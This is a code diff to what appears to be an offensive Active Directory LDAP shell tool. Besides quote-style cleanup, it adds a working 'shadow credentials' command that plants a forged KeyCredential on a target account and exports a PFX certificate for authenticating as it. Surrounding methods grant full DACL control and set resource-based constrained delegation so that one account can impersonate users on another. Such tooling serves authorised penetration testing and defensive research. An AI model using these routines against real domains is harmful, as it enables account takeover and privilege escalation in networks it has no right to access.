         print("Found Target DN: %s" % target.entry_dn)
         print("Target SID: %s\n" % target_sid)
 
-        success = self.client.search(self.domain_dumper.root, '(sAMAccountName=%s)' % escape_filter_chars(grantee_name), attributes=['objectSid'])
+        success = self.client.search(self.domain_dumper.root, "(sAMAccountName=%s)" % escape_filter_chars(grantee_name), attributes=["objectSid"])
         if success is False or len(self.client.entries) != 1:
             raise Exception("Error expected only one search result got %d results", len(self.client.entries))
 
@@ -609,23 +608,23 @@ class LdapShell(cmd.Cmd):
         print("Grantee SID: %s" % grantee_sid)
 
         try:
-            sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=target['nTSecurityDescriptor'].raw_values[0])
+            sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=target["nTSecurityDescriptor"].raw_values[0])
         except IndexError:
             sd = self.create_empty_sd()
 
-        sd['Dacl'].aces.append(self.create_allow_ace(grantee_sid))
-        self.client.modify(target.entry_dn, {'nTSecurityDescriptor':[ldap3.MODIFY_REPLACE, [sd.getData()]]}, controls=controls)
+        sd["Dacl"].aces.append(self.create_allow_ace(grantee_sid))
+        self.client.modify(target.entry_dn, {"nTSecurityDescriptor": [ldap3.MODIFY_REPLACE, [sd.getData()]]}, controls=controls)
 
-        if self.client.result['result'] == 0:
-            print('DACL modified successfully!')
-            print('%s now has control of %s' % (grantee_name, target_name))
+        if self.client.result["result"] == 0:
+            print("DACL modified successfully!")
+            print("%s now has control of %s" % (grantee_name, target_name))
         else:
-            if self.client.result['result'] == 50:
-                raise Exception('Could not modify object, the server reports insufficient rights: %s', self.client.result['message'])
-            elif self.client.result['result'] == 19:
-                raise Exception('Could not modify object, the server reports a constrained violation: %s', self.client.result['message'])
+            if self.client.result["result"] == 50:
+                raise Exception("Could not modify object, the server reports insufficient rights: %s", self.client.result["message"])
+            elif self.client.result["result"] == 19:
+                raise Exception("Could not modify object, the server reports a constrained violation: %s", self.client.result["message"])
             else:
-                raise Exception('The server returned an error: %s', self.client.result['message'])
+                raise Exception("The server returned an error: %s", self.client.result["message"])
 
     def do_set_rbcd(self, line):
         args = shlex.split(line)
@@ -639,7 +638,7 @@ class LdapShell(cmd.Cmd):
         target_sid = args[0]
         grantee_sid = args[1]
 
-        success = self.client.search(self.domain_dumper.root, '(sAMAccountName=%s)' % escape_filter_chars(target_name), attributes=['objectSid', 'msDS-AllowedToActOnBehalfOfOtherIdentity'])
+        success = self.client.search(self.domain_dumper.root, "(sAMAccountName=%s)" % escape_filter_chars(target_name), attributes=["objectSid", "msDS-AllowedToActOnBehalfOfOtherIdentity"])
         if success is False or len(self.client.entries) != 1:
             raise Exception("Error expected only one search result got %d results", len(self.client.entries))
 
@@ -648,7 +647,7 @@ class LdapShell(cmd.Cmd):
         print("Found Target DN: %s" % target.entry_dn)
         print("Target SID: %s\n" % target_sid)
 
-        success = self.client.search(self.domain_dumper.root, '(sAMAccountName=%s)' % escape_filter_chars(grantee_name), attributes=['objectSid'])
+        success = self.client.search(self.domain_dumper.root, "(sAMAccountName=%s)" % escape_filter_chars(grantee_name), attributes=["objectSid"])
         if success is False or len(self.client.entries) != 1:
             raise Exception("Error expected only one search result got %d results", len(self.client.entries))
 
@@ -658,31 +657,94 @@ class LdapShell(cmd.Cmd):
         print("Grantee SID: %s" % grantee_sid)
 
         try:
-            sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=target['msDS-AllowedToActOnBehalfOfOtherIdentity'].raw_values[0])
-            print('Currently allowed sids:')
-            for ace in sd['Dacl'].aces:
-                print('    %s' % ace['Ace']['Sid'].formatCanonical())
+            sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=target["msDS-AllowedToActOnBehalfOfOtherIdentity"].raw_values[0])
+            print("Currently allowed sids:")
+            for ace in sd["Dacl"].aces:
+                print("    %s" % ace["Ace"]["Sid"].formatCanonical())
 
-                if ace['Ace']['Sid'].formatCanonical() == grantee_sid:
+                if ace["Ace"]["Sid"].formatCanonical() == grantee_sid:
                     print("Grantee is already permitted to perform delegation to the target host")
                     return
 
         except IndexError:
             sd = self.create_empty_sd()
 
-        sd['Dacl'].aces.append(self.create_allow_ace(grantee_sid))
-        self.client.modify(target.entry_dn, {'msDS-AllowedToActOnBehalfOfOtherIdentity':[ldap3.MODIFY_REPLACE, [sd.getData()]]})
+        sd["Dacl"].aces.append(self.create_allow_ace(grantee_sid))
+        self.client.modify(target.entry_dn, {"msDS-AllowedToActOnBehalfOfOtherIdentity": [ldap3.MODIFY_REPLACE, [sd.getData()]]})
 
-        if self.client.result['result'] == 0:
-            print('Delegation rights modified successfully!')
-            print('%s can now impersonate users on %s via S4U2Proxy' % (grantee_name, target_name))
+        if self.client.result["result"] == 0:
+            print("Delegation rights modified successfully!")
+            print("%s can now impersonate users on %s via S4U2Proxy" % (grantee_name, target_name))
         else:
-            if self.client.result['result'] == 50:
-                raise Exception('Could not modify object, the server reports insufficient rights: %s', self.client.result['message'])
-            elif self.client.result['result'] == 19:
-                raise Exception('Could not modify object, the server reports a constrained violation: %s', self.client.result['message'])
+            if self.client.result["result"] == 50:
+                raise Exception("Could not modify object, the server reports insufficient rights: %s", self.client.result["message"])
+            elif self.client.result["result"] == 19:
+                raise Exception("Could not modify object, the server reports a constrained violation: %s", self.client.result["message"])
             else:
-                raise Exception('The server returned an error: %s', self.client.result['message'])
+                raise Exception("The server returned an error: %s", self.client.result["message"])
+
+    def do_set_shadow_creds(self, line):
+        args = shlex.split(line)
+
+        if len(args) != 1:
+            raise Exception("Error expecting target name for shadow credentials attack. Recieved %d arguments instead." % len(args))
+
+        target_name = args[0]
+
+        success = self.client.search(self.domain_dumper.root, "(sAMAccountName=%s)" % escape_filter_chars(target_name), attributes=["objectSid", "msDS-KeyCredentialLink"])
+        if success is False or len(self.client.entries) != 1:
+            raise Exception("Error expected only one search result got %d results", len(self.client.entries))
+
+        target = self.client.entries[0]
+        target_sid = target["objectSid"].value
+        print("Found Target DN: %s" % target.entry_dn)
+        print("Target SID: %s\n" % target_sid)
+
+        certificate = X509Certificate2(subject=target_name, keySize=2048, notBefore=(-40 * 365), notAfter=(40 * 365))
+        keyCredential = KeyCredential.fromX509Certificate2(certificate=certificate, deviceId=Guid(), owner=target.entry_dn, currentTime=DateTime())
+        print("KeyCredential generated with DeviceID: %s" % keyCredential.DeviceId.toFormatD())
+
+        try:
+            new_values = target["msDS-KeyCredentialLink"].raw_values + [keyCredential.toDNWithBinary().toString()]
+            self.client.modify(target.entry_dn, {"msDS-KeyCredentialLink": [ldap3.MODIFY_REPLACE, new_values]})
+            print("Shadow credentials successfully added!")
+            if self.client.result["result"] == 0:
+                path = "".join(random.choice(string.ascii_letters + string.digits) for i in range(8))
+                password = "".join(random.choice(string.ascii_letters + string.digits) for i in range(20))
+                certificate.ExportPFX(password=password, path_to_file=path)
+                print("Saved PFX (#PKCS12) certificate & key at path: %s" % path + ".pfx")
+                print("Must be used with password: %s" % password)
+            else:
+                if self.client.result["result"] == 50:
+                    print("Could not modify object, the server reports insufficient rights: %s" % self.client.result["message"])
+                elif self.client.result["result"] == 19:
+                    print("Could not modify object, the server reports a constrained violation: %s" % self.client.result["message"])
+                else:
+                    print("The server returned an error: %s" % self.client.result["message"])
+        except IndexError as e:
+            print("Attribute msDS-KeyCredentialLink does not exist")
+        return
+
+    def do_clear_shadow_creds(self, target):
+        success = self.client.search(self.domain_dumper.root, "(sAMAccountName=%s)" % escape_filter_chars(target), attributes=["objectSid", "msDS-KeyCredentialLink"])
+        if success is False or len(self.client.entries) != 1:
+            raise Exception("Error expected only one search result got %d results", len(self.client.entries))
+
+        target = self.client.entries[0]
+        target_sid = target["objectsid"].value
+        print("Found Target DN: %s" % target.entry_dn)
+        print("Target SID: %s\n" % target_sid)
+
+        self.client.modify(target.entry_dn, {"msDS-KeyCredentialLink": [ldap3.MODIFY_REPLACE, []]})
+        if self.client.result["result"] == 0:
+            print("Shadow credentials cleared successfully!")
+        else:
+            if self.client.result["result"] == 50:
+                raise Exception("Could not modify object, the server reports insufficient rights: %s", self.client.result["message"])
+            elif self.client.result["result"] == 19:
+                raise Exception("Could not modify object, the server reports a constrained violation: %s", self.client.result["message"])
+            else:
+                raise Exception("The server returned an error: %s", self.client.result["message"])
 
     def search(self, query, *attributes):
         self.client.search(self.domain_dumper.root, query, attributes=attributes)
@@ -700,7 +762,7 @@ class LdapShell(cmd.Cmd):
             return sam_name
 
         try:
-            self.client.search(self.domain_dumper.root, '(sAMAccountName=%s)' % escape_filter_chars(sam_name), attributes=['objectSid'])
+            self.client.search(self.domain_dumper.root, "(sAMAccountName=%s)" % escape_filter_chars(sam_name), attributes=["objectSid"])
             return self.client.entries[0].entry_dn
         except IndexError:
             return None
@@ -715,8 +777,8 @@ class LdapShell(cmd.Cmd):
 
         domain_dn = self.domain_dumper.root
         sync_filter = arguments[0]
-        attributes = list(set(['name', 'sAMAccountName', 'objectsid'] + arguments[1:]))
-        
+        attributes = list(set(["name", "sAMAccountName", "objectsid"] + arguments[1:]))
+
         sync = self.client.extend.microsoft.dir_sync(domain_dn, attributes=attributes, sync_filter=sync_filter, incremental_values=False)
 
         results = []
@@ -724,8 +786,8 @@ class LdapShell(cmd.Cmd):
             results += sync.loop()
 
         for result in results:
-            print(result['dn'])
-            for k, v in result['attributes'].items():
+            print(result["dn"])
+            for k, v in result["attributes"].items():
                 print(k, v)
             print()
 
@@ -742,6 +804,7 @@ class LdapShell(cmd.Cmd):
  add_user_to_group user group - Adds a user to a group.
  change_password user [password] - Attempt to change a given user's password. Requires LDAPS.
  clear_rbcd target - Clear the resource based constrained delegation configuration information.
+ clear_shadow_creds target - Clear shadow credentials on the target (sAMAccountName).
  disable_account user - Disable the user's account.
  enable_account user - Enable the user's account.
  dump - Dumps the domain.
@@ -753,6 +816,7 @@ class LdapShell(cmd.Cmd):
  grant_control target grantee - Grant full control of a given target object (sAMAccountName) to the grantee (sAMAccountName).
  set_dontreqpreauth user true/false - Set the don't require pre-authentication flag to true or false.
  set_rbcd target grantee - Grant the grantee (sAMAccountName) the ability to perform RBCD to the target (sAMAccountName).
+ set_shadow_creds target - Set shadow credentials on the target object (sAMAccountName).
  start_tls - Send a StartTLS command to upgrade from LDAP to LDAPS. Use this to bypass channel binding for operations necessitating an encrypted channel.
  write_gpo_dacl user gpoSID - Write a full control ACE to the gpo for the given user. The gpoSID must be entered surrounding by {}.
  whoami - get connected user
@@ -760,5 +824,5 @@ class LdapShell(cmd.Cmd):
  exit - Terminates this session.""")
 
     def do_EOF(self, line):
-        print('Bye!\n')
+        print("Bye!\n")
         return True
